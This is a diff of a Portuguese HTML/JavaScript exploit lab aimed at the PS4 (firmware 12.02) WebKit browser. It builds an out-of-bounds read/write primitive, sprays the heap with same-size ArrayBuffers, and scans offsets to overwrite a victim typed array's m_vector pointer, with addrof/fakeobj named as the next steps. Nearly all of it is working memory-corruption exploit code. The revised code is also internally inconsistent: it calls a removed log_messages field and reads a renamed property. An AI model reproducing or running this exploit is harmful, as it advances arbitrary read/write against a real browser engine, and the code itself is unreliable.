@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Laboratório de Exploração Avançada (v2.6.10 - Refinamento Heap PS4)</title>
+    <title>Laboratório de Exploração Avançada (v2.6.11 - Grooming Agressivo PS4)</title>
     <style>
         body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 10px; font-size: 13px; }
         .container { margin-bottom: 20px; padding: 10px; background-color: #252526; border: 1px solid #333; border-radius: 5px; }
@@ -16,9 +16,9 @@
     </style>
 </head>
 <body>
-    <h1>Laboratório (v2.6.10 - Refinamento Heap PS4 FW 12.02)</h1>
-    <p class="notes">Foco: Melhorar heap grooming, testar GAPs, tentar corromper `m_vector`.</p>
-    <p class="notes">ALTO RISCO DE CRASH! Salve seu trabalho/estado frequentemente.</p>
+    <h1>Laboratório (v2.6.11 - Grooming Agressivo PS4 FW 12.02)</h1>
+    <p class="notes">Foco: Grooming agressivo, objetos de mesmo tamanho, teste de crash para `m_vector`.</p>
+    <p class="notes">ALTO RISCO DE CRASH! Anote o último GAP testado se o navegador fechar.</p>
     <div id="logOutput"></div>
 
     <script>
@@ -52,15 +52,16 @@
             neg() { const low = ~this.low(); const high = ~this.high(); const one = new AdvancedInt64(1,0); const res = new AdvancedInt64(low, high); return res.add(one); }
             eq(other) { if (!(other instanceof AdvancedInt64)) { other = new AdvancedInt64(other); } return this.low() === other.low() && this.high() === other.high(); }
             static fromNumber(num) { if (typeof num !== 'number') throw TypeError('Input must be a number'); return new AdvancedInt64(num); }
-            static Zero = new AdvancedInt64(0,0); static One = new AdvancedInt64(1,0); static NullPtr = new AdvancedInt64(0,0); // Alias para clareza
+            static Zero = new AdvancedInt64(0,0); static One = new AdvancedInt64(1,0); static NullPtr = new AdvancedInt64(0,0); 
         }
+        // ... (readWriteUtils, generalUtils, log, PAUSE_LAB, toHexS1, isPotentialPointer64S1 - como na v2.6.9)
         const readWriteUtils = { readBytes: (u8_view, offset, size) => { let res = 0; for (let i = 0; i < size; i++) { res += u8_view[offset + i] << (i * 8); } return res >>> 0; }, read16: (u8_view, offset) => readWriteUtils.readBytes(u8_view, offset, 2), read32: (u8_view, offset) => readWriteUtils.readBytes(u8_view, offset, 4), read64: (u8_view, offset) => { let resBytes = []; for (let i = 0; i < 8; i++) { resBytes.push(u8_view[offset + i]); } return new AdvancedInt64(new Uint8Array(resBytes)); }, writeBytes: (u8_view, offset, value, size) => { for (let i = 0; i < size; i++) { u8_view[offset + i] = (value >>> (i * 8)) & 0xff; } }, write16: (u8_view, offset, value) => readWriteUtils.writeBytes(u8_view, offset, value, 2), write32: (u8_view, offset, value) => readWriteUtils.writeBytes(u8_view, offset, value, 4), write64: (u8_view, offset, value) => { if (!(value instanceof AdvancedInt64)) { value = new AdvancedInt64(value); } let data_bytes = value.bytes; for (let i = 0; i < 8; i++) { u8_view[offset+i] = data_bytes[i];} } };
         const generalUtils = { logToDiv: (divId, message, type = 'info', funcName = '') => { const outputDiv = document.getElementById(divId); if (!outputDiv) { console.error("logToDiv: Div de log não encontrado:", divId); return; } try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'tool', 'analysis'].includes(type) ? type : 'info'; if(outputDiv.innerHTML.length > 1200000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 600000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; } outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch(e) { console.error(`Erro no log para ${divId}:`, e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; } }, toHexLab: (val, bits = 32) => { if (val instanceof AdvancedInt64) return val.toString(true); if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); } };
         const log = (message, type = 'info', funcName = '') => generalUtils.logToDiv('logOutput', message, type, funcName);
         const PAUSE_LAB = (ms = 100) => new Promise(r => setTimeout(r, ms));
         const toHexS1 = (val, bits = 32) => generalUtils.toHexLab(val, bits);
-        const isPotentialPointer64S1 = (high, low) => { /* ... como na v2.6.8 ... */ if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if ((high === 0xFFFFFFFF || high === -1) && (low === 0xFFFFFFFF || low === -1)) return false; const combined = new AdvancedInt64(low, high); const AAAA_PATTERN_LOW = 0xAAAAAAAA; const AAAA_PATTERN_HIGH = 0xAAAAAAAA; if (combined.low() === AAAA_PATTERN_LOW && combined.high() === AAAA_PATTERN_HIGH) return false; if (combined.low() === AAAA_PATTERN_LOW && combined.high() === 0xAAAAAAEE ) return false; if (combined.low() === 0xAAAAAAEE && combined.high() === AAAA_PATTERN_HIGH ) return false; if (high === 0 && low < 0x100000 && low !==0 ) return false; return true; };
-        
+        const isPotentialPointer64S1 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if ((high === 0xFFFFFFFF || high === -1) && (low === 0xFFFFFFFF || low === -1)) return false; const combined = new AdvancedInt64(low, high); const AAAA_PATTERN_LOW = 0xAAAAAAAA; const AAAA_PATTERN_HIGH = 0xAAAAAAAA; if (combined.low() === AAAA_PATTERN_LOW && combined.high() === AAAA_PATTERN_HIGH) return false; if (combined.low() === AAAA_PATTERN_LOW && combined.high() === 0xAAAAAAEE ) return false; if (combined.low() === 0xAAAAAAEE && combined.high() === AAAA_PATTERN_HIGH ) return false; if (high === 0 && low < 0x100000 && low !==0 ) return false; return true; };
+
         let oob_array_buffer_real = null;
         let oob_dataview_real = null;
         let baseOffsetInBuffer = 128; 
@@ -69,21 +70,22 @@
 
         let victim_object = null; 
         let victim_object_type = 'TypedArray'; 
-        let CURRENT_TEST_GAP = 16; 
+        let CURRENT_TEST_GAP = 0; // Começar com GAP 0, especialmente para objetos de mesmo tamanho
 
         const JSC_OFFSETS = { 
             ArrayBuffer: { PTR_INTERNAL_STRUCT_OFFSET: 0x20, BYTELENGTH_IN_STRUCT_OFFSET: 0x20 },
             TypedArray: { M_VECTOR_OFFSET: 0x10, ASSOCIATED_ARRAYBUFFER_OFFSET: 0x30 }, 
             JSFunction: { M_EXECUTABLE_OFFSET: 0x18 }
         };
-        log("Script v2.6.10 (Refinamento Heap PS4) Carregado.", "info", "Init");
+        log("Script v2.6.10 (Grooming Agressivo PS4) Carregado.", "info", "Init");
     </script>
 
     <div class="container">
         <h2>Passo 0: Ativar Primitiva OOB</h2>
         <button onclick="triggerOOB_primitive()">Ativar Primitiva OOB</button>
         <script>
-            function oob_read_relative(relative_offset, num_bytes = 4) { /* ... como na v2.6.8 ... */
+            // oob_read_relative e oob_write_relative (como na v2.6.9)
+            function oob_read_relative(relative_offset, num_bytes = 4) {
                 const FNAME_READ = "oob_read_relative";
                 if (!oob_dataview_real) { log(`ERRO (${FNAME_READ}): oob_dataview_real não pronto!`, "error"); return null; }
                 const absolute_offset_in_dv = baseOffsetInBuffer + relative_offset;
@@ -100,7 +102,7 @@
                     return value;
                 } catch (e) { return null; }
             }
-            function oob_write_relative(relative_offset, value, num_bytes = 4) { /* ... como na v2.6.8 ... */
+            function oob_write_relative(relative_offset, value, num_bytes = 4) {
                 const FNAME_WRITE = "oob_write_relative";
                 if (!oob_dataview_real) { log(`ERRO (${FNAME_WRITE}): oob_dataview_real não pronto!`, "error"); return; }
                 const absolute_offset_in_dv = baseOffsetInBuffer + relative_offset;
@@ -125,14 +127,14 @@
                 initialBufferSize = 32; 
                 const writeValueToTriggerOOB = 0xEE; 
                 const oobWriteOffsetFromLogicalStart = initialBufferSize; 
-                // const allocationSize = initialBufferSize + 256; // Usar global OOB_ALLOCATION_SIZE
+                // OOB_ALLOCATION_SIZE é global (288)
                 baseOffsetInBuffer = 128;
-
                 oob_array_buffer_real = null; oob_dataview_real = null; 
-
                 try {
+                    // Alocar oob_array_buffer_real com OOB_ALLOCATION_SIZE
                     oob_array_buffer_real = new ArrayBuffer(OOB_ALLOCATION_SIZE); 
                     oob_dataview_real = new DataView(oob_array_buffer_real); 
+                    log(`   oob_array_buffer_real alocado com ${OOB_ALLOCATION_SIZE} bytes.`, "info", FNAME);
                     for (let i = 0; i < oob_array_buffer_real.byteLength; i++) { oob_dataview_real.setUint8(i, 0xAA); }
 
                     const initialOOBWriteAbsoluteAddr = baseOffsetInBuffer + oobWriteOffsetFromLogicalStart; 
@@ -153,60 +155,60 @@
     </div>
     
     <div class="container">
-        <h2>Passo 1: Heap Grooming e Alocação da Vítima (TypedArray)</h2>
-        <p class="notes">Tenta alocar `victim_object` (TypedArray) e `oob_array_buffer_real` (Passo 0) com o mesmo tamanho (288 bytes) para aumentar chance de adjacência.</p>
+        <h2>Passo 1: Heap Grooming Agressivo e Alocação da Vítima (TypedArray)</h2>
+        <p class="notes">Vítima e Buffer OOB terão o mesmo tamanho (`${OOB_ALLOCATION_SIZE}` bytes) para tentar forçar adjacência.</p>
         <button onclick="prepareHeapAndSameSizeVictim()">Preparar Heap & Vítima (Mesmo Tamanho)</button>
         <script>
             const PREP_HEAP_FNAME_SAMESIZE = "prepareHeapAndSameSizeVictim"; 
-            let spray_buffers_samesize = [];
+            let spray_array_samesize = []; // Renomeado para evitar conflito com spray_buffers global se houver
 
-            async function groomHeapForSameSize(spray_count = 100, object_size = OOB_ALLOCATION_SIZE, intermediate_allocs = 50) { 
-                log("Iniciando heap grooming (mesmo tamanho)...", "tool", PREP_HEAP_FNAME_SAMESIZE); 
-                spray_buffers_samesize = []; 
-                // Spray com tamanho diferente para "limpar" outras regiões
-                for (let i = 0; i < spray_count / 2; i++) { spray_buffers_samesize.push(new ArrayBuffer(object_size * 2)); }
+            async function groomHeapForSameSize(spray_count = 500, object_size = OOB_ALLOCATION_SIZE, intermediate_allocs = 100) { 
+                log("Iniciando heap grooming agressivo (mesmo tamanho)...", "tool", PREP_HEAP_FNAME_SAMESIZE); 
+                spray_array_samesize = []; 
                 
-                let holes = []; // Criar buracos do tamanho dos nossos objetos alvo
+                log(`   Fase 1: Spray com tamanho diferente (${object_size * 2} bytes) para preencher/limpar regiões. Contagem: ${spray_count / 2}`, "info", PREP_HEAP_FNAME_SAMESIZE);
+                for (let i = 0; i < spray_count / 2; i++) { spray_array_samesize.push(new ArrayBuffer(object_size * 2)); }
+                
+                log(`   Fase 2: Criação de buracos (${intermediate_allocs} x ${object_size} bytes, ${intermediate_allocs/2} liberados).`, "info", PREP_HEAP_FNAME_SAMESIZE);
+                let holes = [];
                 for (let i = 0; i < intermediate_allocs; i++) { holes.push(new ArrayBuffer(object_size)); }
-                for (let i = 0; i < intermediate_allocs; i += 2) { holes[i] = null; } 
-                log(`   Criação de buracos: ${intermediate_allocs} x ${object_size} bytes, ${intermediate_allocs/2} liberados.`, "info", PREP_HEAP_FNAME_SAMESIZE);
+                for (let i = 0; i < intermediate_allocs; i = i + 2) { holes[i] = null; } // Liberar metade para criar buracos
                 
-                // Spray final com o tamanho exato dos objetos
-                for (let i = 0; i < spray_count; i++) { spray_buffers_samesize.push(new ArrayBuffer(object_size)); }
-                log(`   Spray final: ${spray_count} x ${object_size} bytes.`, "info", PREP_HEAP_FNAME_SAMESIZE);
+                log(`   Fase 3: Spray final com o tamanho exato do objeto (${object_size} bytes). Contagem: ${spray_count}`, "info", PREP_HEAP_FNAME_SAMESIZE);
+                for (let i = 0; i < spray_count; i++) { spray_array_samesize.push(new ArrayBuffer(object_size)); }
 
-                if (typeof globalThis.gc === 'function') { log("Tentando forçar GC...", "tool", PREP_HEAP_FNAME_SAMESIZE); try { globalThis.gc(); await PAUSE_LAB(50); globalThis.gc();} catch(e){} } 
-                log("Heap grooming (mesmo tamanho, tentativa) concluído.", "warn", PREP_HEAP_FNAME_SAMESIZE);
+                if (typeof globalThis.gc === 'function') { 
+                    log("Tentando forçar GC (x2)...", "tool", PREP_HEAP_FNAME_SAMESIZE); 
+                    try { globalThis.gc(); await PAUSE_LAB(100); globalThis.gc();} catch(e){ log("Falha ao forçar GC: " + e.message, "warn", PREP_HEAP_FNAME_SAMESIZE);} 
+                } 
+                log("Heap grooming agressivo (tentativa) concluído.", "warn", PREP_HEAP_FNAME_SAMESIZE);
             }
 
            async function prepareHeapAndSameSizeVictim() { 
                 log(`--- Iniciando ${PREP_HEAP_FNAME_SAMESIZE} ---`, 'test', PREP_HEAP_FNAME_SAMESIZE); 
                 victim_object = null; 
                 
-                // Queremos que o victim_object e o oob_array_buffer_real tenham o mesmo tamanho total
-                // oob_array_buffer_real tem OOB_ALLOCATION_SIZE (288 bytes)
-                const victim_size_bytes = OOB_ALLOCATION_SIZE; 
-                log(`   Alvo: Vítima e oob_array_buffer_real com ${victim_size_bytes} bytes cada.`, "info", PREP_HEAP_FNAME_SAMESIZE);
+                const target_object_size_bytes = OOB_ALLOCATION_SIZE; 
+                log(`   Alvo: Vítima e oob_array_buffer_real com ${target_object_size_bytes} bytes cada.`, "info", PREP_HEAP_FNAME_SAMESIZE);
 
-                await groomHeapForSameSize(100, victim_size_bytes, 50); 
+                // Grooming mais agressivo
+                await groomHeapForSameSize(500, target_object_size_bytes, 100); 
                 
                 victim_object_type = 'TypedArray'; 
-                // Para Uint32Array, o número de elementos é bytes / 4
-                const victim_typed_array_elements = victim_size_bytes / 4;
-                if (victim_size_bytes % 4 !== 0) {
-                    log("ERRO: Tamanho da vítima não é múltiplo de 4 para Uint32Array.", "error", PREP_HEAP_FNAME_SAMESIZE);
-                    return;
+                const victim_typed_array_elements = target_object_size_bytes / 4;
+                if (target_object_size_bytes % 4 !== 0) {
+                    log("ERRO CRÍTICO: Tamanho alvo não é múltiplo de 4 para Uint32Array.", "error", PREP_HEAP_FNAME_SAMESIZE); return;
                 }
                 victim_object = new Uint32Array(victim_typed_array_elements); 
-                for(let i=0; i < victim_object.length; i++) { victim_object[i] = 0xBBBBBBBB; } // Preencher
+                for(let i=0; i < victim_object.length; i++) { victim_object[i] = (0xBB000000 | i) ; } // Padrão único + índice
 
-                log(`Vítima (${victim_object_type} de ${victim_object.byteLength}b) alocada.`, 'good', PREP_HEAP_FNAME_SAMESIZE);
-                log(`   Tamanho do buffer da vítima (JS): ${victim_object.buffer.byteLength}`, "info", PREP_HEAP_FNAME_SAMESIZE);
+                log(`Vítima (${victim_object_type}, ${victim_object.length} elementos, ${victim_object.byteLength}b) alocada.`, 'good', PREP_HEAP_FNAME_SAMESIZE);
                 
-                log("   PRÓXIMOS PASSOS (SCRIPT & OBSERVAÇÃO DE LOGS/CRASHES):", "critical", PREP_HEAP_FNAME_SAMESIZE);
-                log("     1. SCRIPT: Execute Passo 0 (Ativar Primitiva OOB) - alocará oob_array_buffer_real (mesmo tamanho).", "critical");
-                log("     2. SCRIPT: Configure a 'Faixa de GAP para Scan' abaixo (GAPs pequenos como 0, 8, 16, -8, -16 são bons candidatos).", "critical");
-                log("     3. SCRIPT: Execute Passo 2 (Iniciar Busca Iterativa de GAP para m_vector).", "critical");
+                log("   PRÓXIMOS PASSOS:", "critical", PREP_HEAP_FNAME_SAMESIZE);
+                log("     1. SCRIPT: Execute Passo 0 (Ativar Primitiva OOB) - alocará `oob_array_buffer_real` (mesmo tamanho).", "critical");
+                log("     2. SCRIPT: Configure 'Faixa de GAP para Scan' (GAPs PEQUENOS como 0, 8, 16, -8, -16 são prioritários).", "critical");
+                log("     3. SCRIPT: Execute Passo 2 (Busca Iterativa de GAP para m_vector).", "critical");
+                log("     4. LOGS JS: Observe CRASHES ou um `m_vector` original VÁLIDO sendo lido para um GAP específico.", "critical");
                 log(`--- ${PREP_HEAP_FNAME_SAMESIZE} Concluído ---`, 'test', PREP_HEAP_FNAME_SAMESIZE);
             }
         </script>
@@ -214,7 +216,7 @@
 
      <div class="container">
         <h2>Passo 2: Busca Iterativa de GAP & Corrupção de `TypedArray.m_vector`</h2>
-        <p class="notes">Tenta ler e depois sobrescrever o `m_vector` da Vítima TypedArray para cada GAP na faixa. Se um GAP causar crash após a escrita no m_vector, ele é um forte candidato.</p>
+        <p class="notes">Tenta ler e depois sobrescrever o `m_vector` da Vítima TypedArray para cada GAP na faixa. Um CRASH após a escrita no `m_vector` com um endereço de teste (`0x1`) para um GAP específico é um FORTE INDICADOR de sucesso em encontrar o GAP e controlar o `m_vector`.</p>
         <div>
             <label for="gapStartScan">GAP Início:</label> <input type="number" id="gapStartScan" value="-32">
             <label for="gapEndScan">GAP Fim:</label> <input type="number" id="gapEndScan" value="64">
@@ -224,9 +226,11 @@
         <button onclick="findAndCorruptVictimMVectors_Iterative()">Iniciar Busca & Corrupção de m_vector</button>
         <script>
             const ITER_MVECTOR_FNAME = "findAndCorruptVictimMVectors_Iterative"; 
-            let corrupted_victim_typed_array = null; 
+            // Variáveis globais para resultado da corrupção não são mais necessárias aqui,
+            // pois a função de busca tentará obter o resultado final.
 
             function updateCurrentTestGapFromScanUI() {
+                // ... (como na v2.6.9 - para definir CURRENT_TEST_GAP para um teste único)
                 const gapVal = parseInt(document.getElementById('gapStartScan').value);
                 if (!isNaN(gapVal)) {
                     CURRENT_TEST_GAP = gapVal;
@@ -236,18 +240,18 @@
                 }
             }
             
-            async function try_read_then_corrupt_mvector(current_gap_to_test) {
-                const FNAME_TRY_MVEC = "try_read_then_corrupt_mvector";
-                let result_info = {
-                    gap_tested: current_gap_to_test,
-                    original_mvector_hex: "N/A (Leitura Falhou ou GAP Inválido)",
-                    mvector_written_with_test_addr: false,
-                    crash_or_error_after_write: "Não Testado", 
-                    log_messages: []
+            async function try_corrupt_mvector_for_gap(current_gap_to_test) {
+                const FNAME_TRY_MVEC = "try_corrupt_mvector_for_gap";
+                let result = {
+                    gap: current_gap_to_test,
+                    original_mvector_hex: "N/A",
+                    wrote_to_mvector: false,
+                    access_after_write_caused_error: "Não Testado",
+                    success_indicator: false // True se um crash/erro esperado ocorrer
                 };
 
                 if (victim_object_type !== 'TypedArray') {
-                    result_info.log_messages.push("Vítima não é TypedArray. Pulando teste de m_vector."); return result_info;
+                    log("Vítima não é TypedArray.", "error", `${ITER_MVECTOR_FNAME}::${FNAME_TRY_MVEC}`); return result;
                 }
 
                 const victim_jscell_rel_offset_from_oob_logical_start = initialBufferSize + current_gap_to_test;
@@ -255,42 +259,42 @@
                 const m_vector_field_rel_offset_from_oob_base = victim_jscell_rel_offset_from_oob_logical_start + m_vector_field_abs_offset_in_jscell;
                 const m_vector_field_abs_offset_in_dv = baseOffsetInBuffer + m_vector_field_rel_offset_from_oob_base;
 
-                result_info.log_messages.push(`  GAP ${current_gap_to_test}: Tentando R/W m_vector em abs_dv_offset ${m_vector_field_abs_offset_in_dv}`);
+                log(`  GAP ${current_gap_to_test}: Tentando R/W m_vector em abs_dv_offset ${m_vector_field_abs_offset_in_dv}`, "subtest", `${ITER_MVECTOR_FNAME}::${FNAME_TRY_MVEC}`);
 
                 if (m_vector_field_abs_offset_in_dv < 0 || m_vector_field_abs_offset_in_dv + 8 > oob_dataview_real.buffer.byteLength) {
-                    result_info.log_messages.push(`     ↳ m_vector (abs_dv ${m_vector_field_abs_offset_in_dv}) FORA DO ALCANCE do oob_dataview_real. Pulando GAP.`);
-                    return result_info;
+                    log(`     ↳ m_vector target (abs_dv ${m_vector_field_abs_offset_in_dv}) FORA DO ALCANCE do oob_dataview_real. Pulando GAP.`, "warn", `${ITER_MVECTOR_FNAME}::${FNAME_TRY_MVEC}`);
+                    return result;
                 }
                 
-                // 1. Tentar ler o m_vector original
+                // 1. Tentar ler o m_vector original (Opcional, mas bom para depuração se funcionar)
                 let original_mvector = oob_read_relative(m_vector_field_rel_offset_from_oob_base, 8);
                 if (original_mvector instanceof AdvancedInt64 && !original_mvector.toString(false).toLowerCase().includes("aaaa")) {
-                    result_info.original_mvector_hex = original_mvector.toString(true);
-                    result_info.log_messages.push(`     ↳ ACHADO m_vector ORIGINAL POTENCIAL: ${result_info.original_mvector_hex}`);
+                    result.original_mvector_hex = original_mvector.toString(true);
+                    log(`     ↳ GAP ${current_gap_to_test}: ACHADO m_vector ORIGINAL POTENCIAL: ${result.original_mvector_hex}`, "leak", `${ITER_MVECTOR_FNAME}::${FNAME_TRY_MVEC}`);
                 } else {
-                     result_info.log_messages.push(`     ↳ GAP ${current_gap_to_test}: m_vector lido foi lixo ou zero (${original_mvector ? original_mvector.toString(true) : "null/não Adv64"}). Não prosseguindo com escrita para este GAP.`);
-                     return result_info; // Não tentar corromper se a leitura inicial falhar em obter algo que pareça um ponteiro
+                    log(`     ↳ GAP ${current_gap_to_test}: Leitura do m_vector original retornou lixo ou zero (${original_mvector ? original_mvector.toString(true) : "null/não Adv64"}).`, "info", `${ITER_MVECTOR_FNAME}::${FNAME_TRY_MVEC}`);
                 }
                 
-                // 2. Se a leitura foi promissora, Tentar corromper m_vector com um endereço de CRASH conhecido
-                const crash_test_address = AdvancedInt64.One; // 0x0...1 (deve crashar)
-                log(`       Tentando escrever NOVO m_vector: ${crash_test_address.toString(true)} para causar crash...`, "vuln", `${FNAME_TRY_MVEC} (GAP ${current_gap_to_test})`);
+                // 2. Tentar corromper m_vector com um endereço de CRASH conhecido
+                const crash_test_address = AdvancedInt64.One; // 0x0...1 (deve crashar ao ser dereferenciado)
+                // const crash_test_address = new AdvancedInt64(0x42424242, 0x42420000); // Outro endereço de teste
+                
+                log(`       Tentando escrever NOVO m_vector: ${crash_test_address.toString(true)} para rel_oob_base ${m_vector_field_rel_offset_from_oob_base}...`, "vuln", `${ITER_MVECTOR_FNAME}::${FNAME_TRY_MVEC}`);
                 oob_write_relative(m_vector_field_rel_offset_from_oob_base, crash_test_address, 8);
-                result_info.mvector_written_with_test_addr = true;
-                await PAUSE_LAB(SHORT_PAUSE_S1_LAB);
+                result.wrote_to_mvector = true;
+                await PAUSE_LAB(100); // Pausa para a escrita e potenciais efeitos colaterais se propagarem
 
                 try {
-                    log(`       Tentando acessar victim_object[0] (esperando CRASH se m_vector foi ${crash_test_address.toString(true)})...`, "warn", `${FNAME_TRY_MVEC} (GAP ${current_gap_to_test})`);
-                    let val = victim_object[0]; 
-                    result_info.log_messages.push(`       Acesso a victim_object[0] NÃO CRASHOU. Valor lido: ${toHexS1(val)}`);
-                    result_info.crash_or_error_after_write = "Não crashou";
+                    log(`       Tentando acessar victim_object[0] (esperando CRASH se m_vector foi ${crash_test_address.toString(true)})...`, "critical", `${ITER_MVECTOR_FNAME}::${FNAME_TRY_MVEC}`);
+                    let val = victim_object[0]; // <<<< PONTO DE CRASH POTENCIAL
+                    log(`       ACESSO A victim_object[0] NÃO CRASHOU. Valor lido (pode ser lixo): ${toHexS1(val)}`, "warn", `${ITER_MVECTOR_FNAME}::${FNAME_TRY_MVEC}`);
+                    result.access_after_write_caused_error = `Não crashou, leu ${toHexS1(val)}`;
                 } catch (e) {
-                    result_info.log_messages.push(`       CRASH/ERRO ESPERADO ao acessar victim_object[0] após m_vector=${crash_test_address.toString(true)}: ${e.message}`);
-                    result_info.crash_or_error_after_write = `Sim (${e.message})`;
-                    corrupted_victim_typed_array = victim_object; // Marcar como potencialmente controlado
-                    log(`       CRASH/ERRO OBSERVADO com GAP ${current_gap_to_test} ao tentar m_vector=${crash_test_address.toString(true)}! ESTE GAP É PROMISSOR!`, "critical");
+                    log(`       CRASH/ERRO ESPERADO ao acessar victim_object[0] (m_vector=${crash_test_address.toString(true)}): ${e.message}`, "good", `${ITER_MVECTOR_FNAME}::${FNAME_TRY_MVEC}`);
+                    result.access_after_write_caused_error = `Sim (${e.message})`;
+                    result.success_indicator = true; // Crash/erro é o sucesso aqui!
                 }
-                return result_info;
+                return result;
             }
             
             async function findAndCorruptVictimMVectors_Iterative() {
@@ -307,47 +311,52 @@
                     log("ERRO: Configuração de faixa de GAP inválida.", "error", FNAME); return;
                 }
                 log(`   Iniciando busca de GAP de ${gapStart} a ${gapEnd}, passo ${gapStep}. Alvo: ${victim_object_type}.m_vector.`, "info", FNAME);
-                log(`   ALTO RISCO DE CRASH! Monitore o PS4. Se crashar, o último GAP testado é o candidato.`, "critical", FNAME);
+                log(`   Se o navegador CRASHAR, o ÚLTIMO 'Testando GAP: X' no log indica o GAP candidato.`, "critical", FNAME);
                 await PAUSE_LAB(2000); 
 
                 let successful_corruption_gap = -1;
-                let found_valid_original_mvector = false;
+                let best_gap_info = null;
 
                 for (let current_gap = gapStart; current_gap <= gapEnd; current_gap += gapStep) {
                     log(`Testando GAP: ${current_gap}`, "test", FNAME);
-                    const gapInputEl = document.getElementById('gapToVictim'); 
-                    if (gapInputEl) { gapInputEl.value = current_gap; } // Atualiza UI legado
+                    const gapInputEl_legacy = document.getElementById('gapToVictim'); 
+                    if (gapInputEl_legacy) { gapInputEl_legacy.value = current_gap; }
                     CURRENT_TEST_GAP = current_gap; 
 
-                    const result = await try_read_then_corrupt_mvector(current_gap);
+                    const result = await try_corrupt_mvector_for_gap(current_gap);
                     result.log_messages.forEach(msg => log(msg, "info", `${FNAME} (GAP ${current_gap})`));
 
-                    if (result.original_mvector_hex !== "N/A (Leitura Falhou ou GAP Inválido)" && !result.original_mvector_hex.toLowerCase().includes("aaaa")) {
-                        found_valid_original_mvector = true;
-                        log(`  Para GAP ${current_gap}, m_vector original VÁLIDO lido: ${result.original_mvector_hex}.`, "good", FNAME);
-                        if (result.crash_or_error_after_write.startsWith("Sim")) {
-                             successful_corruption_gap = current_gap;
-                             log(`CORRUPÇÃO DE M_VECTOR CONFIRMADA POR CRASH/ERRO com GAP = ${successful_corruption_gap}!`, "critical", FNAME);
-                             break; // Parar no primeiro GAP que causa crash após escrita
+                    if (result.success_indicator) { // Sucesso é um crash/erro esperado
+                        successful_corruption_gap = current_gap;
+                        best_gap_info = result;
+                        log(`CORRUPÇÃO DE M_VECTOR APARENTEMENTE BEM SUCEDIDA (CRASH/ERRO OBSERVADO) com GAP = ${successful_corruption_gap}!`, "critical", FNAME);
+                        log(`   m_vector Original Lido (se possível): ${result.original_mvector_hex}`, "leak", FNAME);
+                        break; 
+                    } else if (result.original_mvector_hex !== "N/A (Leitura Falhou ou GAP Inválido)" && !result.original_mvector_hex.toLowerCase().includes("aaaa")) {
+                        if (!best_gap_info || !best_gap_info.success_indicator) { // Priorizar o primeiro GAP que leu algo válido se nenhum crash ocorreu ainda
+                           best_gap_info = result;
+                           log(`   GAP ${current_gap} LEU UM M_VECTOR ORIGINAL VÁLIDO: ${result.original_mvector_hex}. Acesso pós-escrita: ${result.access_after_write_caused_error}`, "good", FNAME);
                         }
                     }
                     
-                    await PAUSE_LAB(300); 
+                    await PAUSE_LAB(400); // Pausa para permitir logs e observação
                     if (document.hidden) { log("Busca abortada, página não visível.", "warn", FNAME); break; }
-                    if (current_gap < gapEnd && (current_gap + gapStep) > gapEnd && (current_gap + gapStep) !== gapEnd ) { current_gap = gapEnd - gapStep; } // Ajuste para testar o valor final
+                    // Ajuste para garantir que o valor final seja testado se o passo não o atingir exatamente
+                    if (current_gap < gapEnd && (current_gap + gapStep) > gapEnd && (current_gap + gapStep) !== gapEnd ) { 
+                        current_gap = gapEnd - gapStep; 
+                    }
                 }
 
                 if (successful_corruption_gap !== -1) {
-                    log(`Busca iterativa concluída. GAP FUNCIONAL PARA M_VECTOR: ${successful_corruption_gap}`, "good", FNAME);
-                     log("   VOCÊ AGORA TEM UMA FORTE INDICAÇÃO DE CONTROLE SOBRE M_VECTOR!", "vuln", FNAME);
-                     log("   Próximos passos: usar este GAP para escrever um ponteiro útil no m_vector (ex: para seu oob_array_buffer_real) e tentar R/W.", "info", FNAME);
-                } else if (found_valid_original_mvector) {
-                    log("Busca iterativa concluída. Um m_vector original válido foi lido, mas a tentativa de corrupção não causou crash/erro esperado.", "warn", FNAME);
-                    log("   Isso pode significar que a escrita falhou, ou o endereço de teste 0x1 não causa crash no seu sistema, ou o acesso foi otimizado.", "warn", FNAME);
-                    log("   Foque nos GAPs que permitiram ler um m_vector válido.", "info", FNAME);
-                }
-                else {
-                    log("Busca iterativa de GAP concluída. Nenhum m_vector original válido foi lido / nenhuma corrupção confirmada.", "warn", FNAME);
+                    log(`Busca iterativa concluída. GAP PROMISSOR PARA M_VECTOR (causou crash/erro): ${successful_corruption_gap}`, "good", FNAME);
+                     log("   VOCÊ TEM UMA FORTE INDICAÇÃO DE CONTROLE SOBRE M_VECTOR!", "vuln", FNAME);
+                     log("   Use este GAP para testes futuros. Próximos passos: addrof/fakeobj.", "info", FNAME);
+                } else if (best_gap_info && best_gap_info.original_mvector_hex !== "N/A (Leitura Falhou ou GAP Inválido)") {
+                     log("Busca iterativa concluída. Nenhum crash/erro induzido, mas um m_vector original válido foi lido:", "warn", FNAME);
+                     log(`   Melhor Candidato: GAP ${best_gap_info.gap_tested}, m_vector Original Lido: ${best_gap_info.original_mvector_hex}`, "leak", FNAME);
+                     log("   A escrita do endereço de teste pode não ter surtido efeito visível ou o endereço 0x1 não crasha.", "warn", FNAME);
+                } else {
+                    log("Busca iterativa de GAP concluída. Nenhum m_vector original válido foi lido / nenhuma corrupção confirmada por crash.", "error", FNAME);
                     log("   Tente ajustar a faixa de GAP, os parâmetros de heap grooming, ou verificar os offsets JSC.", "critical", FNAME);
                 }
                 log(`--- ${FNAME} Concluído ---`, 'test', FNAME);
